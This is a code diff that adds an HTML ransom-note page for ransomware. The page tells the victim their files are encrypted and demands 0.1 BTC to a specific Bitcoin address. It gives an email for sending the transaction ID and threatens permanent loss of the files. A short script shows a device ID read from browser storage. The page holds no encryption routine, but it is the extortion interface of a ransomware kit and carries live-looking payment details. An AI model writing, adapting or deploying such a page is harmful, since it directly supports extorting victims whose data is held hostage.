@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ransomware Warning</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #343a40;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #212529;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+        }
+        .header {
+            font-size: 2.5em;
+            color: #dc3545;
+        }
+        .content p {
+            margin-top: 20px;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 1.2em;
+            color: #28a745;
+        }
+    </style>
+</head>
+<body>
+    <div class="container text-center">
+        <div class="header">
+            Your Files Have Been Encrypted!
+        </div>
+        <div class="content">
+            <p>All your important files have been encrypted. To restore access to your files, you need to pay a ransom.</p>
+            <p>Your unique device ID is: <span id="device-id" class="font-weight-bold"></span></p>
+            <p>Send a payment of <strong>0.1 BTC</strong> to the following Bitcoin address:</p>
+            <p><strong class="text-warning">bc1qz2xstk3wcdj7v0yqmvd5jkf9jja9nyq7qfp645</strong></p>
+            <p>After payment, send the transaction ID to our email:</p>
+            <p><strong class="text-info">4rfvz8lk1@mozmail.com</strong></p>
+        </div>
+        <div class="footer">
+            Failure to pay will result in permanent loss of your files.
+        </div>
+    </div>
+
+    <!-- jQuery and Bootstrap Bundle (includes Popper) -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    
+    <script>
+        // Retrieve the device ID from localStorage
+        var deviceId = localStorage.getItem('id');
+
+        // Display the device ID in the message
+        document.getElementById('device-id').innerText = deviceId;
+    </script>
+</body>
+</html>
+
